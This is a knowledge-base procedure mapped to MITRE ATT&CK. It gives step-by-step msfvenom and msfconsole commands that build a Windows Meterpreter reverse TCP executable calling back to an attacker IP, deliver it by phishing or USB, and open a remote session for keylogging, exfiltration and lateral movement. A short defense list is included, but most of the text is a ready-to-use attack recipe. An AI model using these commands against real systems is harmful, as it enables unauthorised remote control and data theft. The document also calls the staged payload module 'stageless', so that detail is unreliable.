---
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/Commonly Used Port|T1043 - Commonly Used Port]]'
  - >-
    [[techniques/Obfuscated Files or Information|T1027 - Obfuscated Files or
    Information]]
sub_techniques: []
tags:
  - '[[tags/Meterpreter Shell]]'
  - '[[tags/Reverse Shell]]'
  - '[[tags/Windows Stageless Reverse TCP]]'
commands:
  - '[[commands/msfvenom-generate-windows-meterpreter-reverse-tcp]]'
platforms:
  - Windows
tools:
  - '[[tools/Metasploit Framework]]'
validated: true
---

# Generate-Windows-Meterpreter-Reverse-TCP-Payload

## Summary

This procedure outlines how to generate a stageless Windows Meterpreter reverse TCP payload using msfvenom from the Metasploit Framework. The payload establishes a reverse connection from the target Windows machine back to the attacker's listener, providing an interactive Meterpreter shell for command execution, file transfer, and post-exploitation activities. It is commonly used in penetration testing to simulate remote code execution and maintain access while evading basic detection.

## Description

The technique leverages msfvenom to create a standalone executable payload that, when run on a Windows target, initiates a TCP connection to a specified listener IP and port. Unlike staged payloads, this stageless version embeds the full Meterpreter shellcode, reducing network artifacts but increasing payload size. Once connected, the attacker gains a Meterpreter session enabling advanced capabilities like keylogging, screenshot capture, and privilege escalation. This is suitable for scenarios with initial access via phishing or exploit delivery, targeting Windows environments (XP to modern versions). Prerequisites include Metasploit installed on the attacker's machine and a way to deliver the executable to the target, such as via social engineering or drive-by download. Success results in a persistent command-and-control channel, but detection risks include antivirus signatures on the executable and anomalous outbound connections.

## Requirements

1. Metasploit Framework installed on the attacker's machine (Kali Linux or compatible environment).
2. Network accessibility: The target must be able to reach the attacker's IP and port (e.g., no firewall blocking outbound TCP to the listener port).
3. Delivery mechanism: A method to transfer and execute the generated .exe on the Windows target (e.g., email attachment, USB, or remote execution tool).
4. Listener setup: A running Metasploit handler to catch the incoming connection.

## Defense

- Deploy endpoint detection and response (EDR) tools to scan for and block known Metasploit payloads.
- Implement application whitelisting to prevent unauthorized executable execution on Windows systems.
- Monitor network traffic for suspicious outbound connections to high or non-standard ports.
- Use obfuscation detection in antivirus and enable PowerShell logging for script-based deliveries.

## Objectives

1. Generate a functional reverse TCP Meterpreter payload executable.
2. Establish a command-and-control session with the target Windows machine.
3. Enable post-exploitation actions like data exfiltration or lateral movement.

## Instructions

### Step 1: Set Up Metasploit Listener

**Context**: Before generating the payload, configure a handler in Metasploit to listen for the incoming reverse connection. This ensures the payload connects successfully upon execution.

Start msfconsole and set up the multi/handler:

```bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $_ATTACKER_IP
set LPORT $_LISTEN_PORT
exploit -j
```

> This command initializes a backgrounded handler job. Replace $_ATTACKER_IP with your machine's IP (e.g., 10.0.0.1) and $_LISTEN_PORT with an open port (e.g., 4444). Expected output includes confirmation of the handler starting and listening on the specified port.

### Step 2: Generate the Payload with msfvenom

**Context**: Use msfvenom to create the stageless executable payload matching the listener configuration. This step produces the .exe file that will be delivered to the target.

**Command** ([[commands/msfvenom-generate-windows-meterpreter-reverse-tcp]]):

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$_ATTACKER_IP LPORT=$_LISTEN_PORT -f exe > windows_meterpreter_reverse.exe
```

> The msfvenom tool generates the payload with the specified reverse TCP module. LHOST and LPORT must match the handler settings. The -f exe flag outputs a Windows executable. Expected output is a binary file (windows_meterpreter_reverse.exe) of approximately 30-40 KB, with no console errors during generation. Verify file creation with `ls -la windows_meterpreter_reverse.exe`.

### Step 3: Deliver and Execute the Payload

**Context**: Transfer the generated executable to the target Windows machine and execute it to trigger the reverse connection. This step assumes initial access or a delivery vector is available.

Use a delivery method like copying via SMB or embedding in a document:

1. Transfer the file to the target (e.g., via `scp` or phishing).
2. On the target, execute the .exe (e.g., double-click or via command prompt: `windows_meterpreter_reverse.exe`).

> If executed successfully, the payload runs silently and connects back. On the attacker side, check the Metasploit console for a new session. Expected output: `[*] Meterpreter session 1 opened (your_ip:port -> target_ip:port)`. If no connection, verify network reachability and firewall rules.

### Step 4: Interact with the Meterpreter Session

**Context**: Once connected, interact with the shell to perform actions, confirming control over the target.

In msfconsole:

```bash
sessions -i 1
```

> This interacts with session 1. Expected output: A Meterpreter prompt (`meterpreter >`). Test with basic commands like `sysinfo` to verify target details (e.g., OS version, architecture).
